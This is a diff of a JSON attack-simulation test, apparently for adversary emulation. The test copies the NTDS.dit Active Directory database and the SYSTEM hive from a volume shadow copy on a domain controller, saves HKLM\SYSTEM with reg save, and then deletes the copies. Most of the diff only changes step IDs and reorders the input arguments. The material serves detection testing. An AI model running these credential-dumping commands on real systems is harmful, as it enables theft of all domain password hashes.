@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "badb1f73-59f7-4783-bf89-4402382e55ee",
+      "id": "2db1885d-fab1-465a-9312-0924099a3e74",
       "type": "execute-command",
       "data": {
         "command": "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "6e1b8ed4-a58c-4deb-947a-418ff3b6ac13",
+      "id": "2fbfde95-908d-47d4-b1ed-afac2e5139bb",
       "type": "execute-command",
       "data": {
         "command": "del \"#{extract_path}\\ntds.dit\"        \u003enul 2\u003e nul\ndel \"#{extract_path}\\VSC_SYSTEM_HIVE\" \u003enul 2\u003e nul\ndel \"#{extract_path}\\SYSTEM_HIVE\"     \u003enul 2\u003e nul\n",
@@ -25,7 +25,7 @@
       "elevation_required": false
     },
     {
-      "id": "7d9d579c-8c55-4440-98f8-006724b923a1",
+      "id": "27246938-1e7a-459c-abf1-cb23a233abb4",
       "name": "Check dependency 1/3",
       "description": "Target must be a Domain Controller\n",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": false
     },
     {
-      "id": "739c018f-b5cd-4a73-8328-1d1ca804354a",
+      "id": "bb26dd2c-9998-4fee-b623-86c9d102d60c",
       "name": "Resolve dependency 1/3",
       "description": "Target must be a Domain Controller\n",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": false
     },
     {
-      "id": "8abe65d5-451e-4b32-93da-5821439c3d2a",
+      "id": "489adbe2-bc06-4c60-bbc4-4b9389888a61",
       "name": "Re-check dependency 1/3",
       "description": "Target must be a Domain Controller\n",
       "type": "execute-command",
@@ -58,7 +58,7 @@
       "elevation_required": false
     },
     {
-      "id": "5365afb9-4613-4d9a-a157-5d4002a70773",
+      "id": "5d4d1522-43d3-4278-b43f-e39bf404b8c1",
       "name": "Check dependency 2/3",
       "description": "Volume shadow copy must exist\n",
       "type": "execute-command",
@@ -69,7 +69,7 @@
       "elevation_required": false
     },
     {
-      "id": "9e199162-4240-40a8-8547-4ec25ed4ffb2",
+      "id": "5822fa4f-b974-4337-9085-a2cc500eaee4",
       "name": "Resolve dependency 2/3",
       "description": "Volume shadow copy must exist\n",
       "type": "execute-command",
@@ -80,7 +80,7 @@
       "elevation_required": false
     },
     {
-      "id": "f8aa8264-200e-4e40-b777-80bd85545e5a",
+      "id": "d6b03d7f-5bdd-46ad-8cc2-56a743b96baf",
       "name": "Re-check dependency 2/3",
       "description": "Volume shadow copy must exist\n",
       "type": "execute-command",
@@ -91,7 +91,7 @@
       "elevation_required": false
     },
     {
-      "id": "d67d50ee-5cd6-4df0-9069-8b575d6d521f",
+      "id": "740b564d-f449-46f4-b3a6-7f5896e739a1",
       "name": "Check dependency 3/3",
       "description": "Extract path must exist\n",
       "type": "execute-command",
@@ -102,7 +102,7 @@
       "elevation_required": false
     },
     {
-      "id": "06b815ef-afd2-421d-9249-45104c445cd2",
+      "id": "4fa76d38-b702-4c6e-9fc8-d30d5510a6c9",
       "name": "Resolve dependency 3/3",
       "description": "Extract path must exist\n",
       "type": "execute-command",
@@ -113,7 +113,7 @@
       "elevation_required": false
     },
     {
-      "id": "46a35640-5ee7-4c96-8df3-e62812ff0c8d",
+      "id": "1b2ce69c-cbe6-48d6-a546-d4ad6439fb74",
       "name": "Re-check dependency 3/3",
       "description": "Extract path must exist\n",
       "type": "execute-command",
@@ -126,74 +126,74 @@
   ],
   "flows": [
     {
-      "s": "badb1f73-59f7-4783-bf89-4402382e55ee",
+      "s": "2db1885d-fab1-465a-9312-0924099a3e74",
       "p": "on-success",
-      "o": "6e1b8ed4-a58c-4deb-947a-418ff3b6ac13"
+      "o": "2fbfde95-908d-47d4-b1ed-afac2e5139bb"
     },
     {
-      "s": "badb1f73-59f7-4783-bf89-4402382e55ee",
+      "s": "2db1885d-fab1-465a-9312-0924099a3e74",
       "p": "on-failure",
-      "o": "6e1b8ed4-a58c-4deb-947a-418ff3b6ac13"
+      "o": "2fbfde95-908d-47d4-b1ed-afac2e5139bb"
     },
     {
-      "s": "7d9d579c-8c55-4440-98f8-006724b923a1",
+      "s": "27246938-1e7a-459c-abf1-cb23a233abb4",
       "p": "on-success",
-      "o": "badb1f73-59f7-4783-bf89-4402382e55ee"
+      "o": "2db1885d-fab1-465a-9312-0924099a3e74"
     },
     {
-      "s": "7d9d579c-8c55-4440-98f8-006724b923a1",
+      "s": "27246938-1e7a-459c-abf1-cb23a233abb4",
       "p": "on-failure",
-      "o": "739c018f-b5cd-4a73-8328-1d1ca804354a"
+      "o": "bb26dd2c-9998-4fee-b623-86c9d102d60c"
     },
     {
-      "s": "739c018f-b5cd-4a73-8328-1d1ca804354a",
+      "s": "bb26dd2c-9998-4fee-b623-86c9d102d60c",
       "p": "on-success",
-      "o": "8abe65d5-451e-4b32-93da-5821439c3d2a"
+      "o": "489adbe2-bc06-4c60-bbc4-4b9389888a61"
     },
     {
-      "s": "8abe65d5-451e-4b32-93da-5821439c3d2a",
+      "s": "489adbe2-bc06-4c60-bbc4-4b9389888a61",
       "p": "on-failure",
-      "o": "badb1f73-59f7-4783-bf89-4402382e55ee"
+      "o": "2db1885d-fab1-465a-9312-0924099a3e74"
     },
     {
-      "s": "5365afb9-4613-4d9a-a157-5d4002a70773",
+      "s": "5d4d1522-43d3-4278-b43f-e39bf404b8c1",
       "p": "on-success",
-      "o": "badb1f73-59f7-4783-bf89-4402382e55ee"
+      "o": "2db1885d-fab1-465a-9312-0924099a3e74"
     },
     {
-      "s": "5365afb9-4613-4d9a-a157-5d4002a70773",
+      "s": "5d4d1522-43d3-4278-b43f-e39bf404b8c1",
       "p": "on-failure",
-      "o": "9e199162-4240-40a8-8547-4ec25ed4ffb2"
+      "o": "5822fa4f-b974-4337-9085-a2cc500eaee4"
     },
     {
-      "s": "9e199162-4240-40a8-8547-4ec25ed4ffb2",
+      "s": "5822fa4f-b974-4337-9085-a2cc500eaee4",
       "p": "on-success",
-      "o": "f8aa8264-200e-4e40-b777-80bd85545e5a"
+      "o": "d6b03d7f-5bdd-46ad-8cc2-56a743b96baf"
     },
     {
-      "s": "f8aa8264-200e-4e40-b777-80bd85545e5a",
+      "s": "d6b03d7f-5bdd-46ad-8cc2-56a743b96baf",
       "p": "on-failure",
-      "o": "badb1f73-59f7-4783-bf89-4402382e55ee"
+      "o": "2db1885d-fab1-465a-9312-0924099a3e74"
     },
     {
-      "s": "d67d50ee-5cd6-4df0-9069-8b575d6d521f",
+      "s": "740b564d-f449-46f4-b3a6-7f5896e739a1",
       "p": "on-success",
-      "o": "badb1f73-59f7-4783-bf89-4402382e55ee"
+      "o": "2db1885d-fab1-465a-9312-0924099a3e74"
     },
     {
-      "s": "d67d50ee-5cd6-4df0-9069-8b575d6d521f",
+      "s": "740b564d-f449-46f4-b3a6-7f5896e739a1",
       "p": "on-failure",
-      "o": "06b815ef-afd2-421d-9249-45104c445cd2"
+      "o": "4fa76d38-b702-4c6e-9fc8-d30d5510a6c9"
     },
     {
-      "s": "06b815ef-afd2-421d-9249-45104c445cd2",
+      "s": "4fa76d38-b702-4c6e-9fc8-d30d5510a6c9",
       "p": "on-success",
-      "o": "46a35640-5ee7-4c96-8df3-e62812ff0c8d"
+      "o": "1b2ce69c-cbe6-48d6-a546-d4ad6439fb74"
     },
     {
-      "s": "46a35640-5ee7-4c96-8df3-e62812ff0c8d",
+      "s": "1b2ce69c-cbe6-48d6-a546-d4ad6439fb74",
       "p": "on-failure",
-      "o": "badb1f73-59f7-4783-bf89-4402382e55ee"
+      "o": "2db1885d-fab1-465a-9312-0924099a3e74"
     }
   ],
   "tags": [
@@ -202,16 +202,16 @@
   ],
   "input_arguments": [
     {
-      "name": "extract_path",
-      "type": "path",
-      "description": "Path for extracted NTDS.dit",
-      "value": "C:\\Windows\\Temp"
-    },
-    {
       "name": "vsc_name",
       "type": "string",
       "description": "Name of Volume Shadow Copy",
       "value": "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1"
+    },
+    {
+      "name": "extract_path",
+      "type": "path",
+      "description": "Path for extracted NTDS.dit",
+      "value": "C:\\Windows\\Temp"
     }
   ]
 }
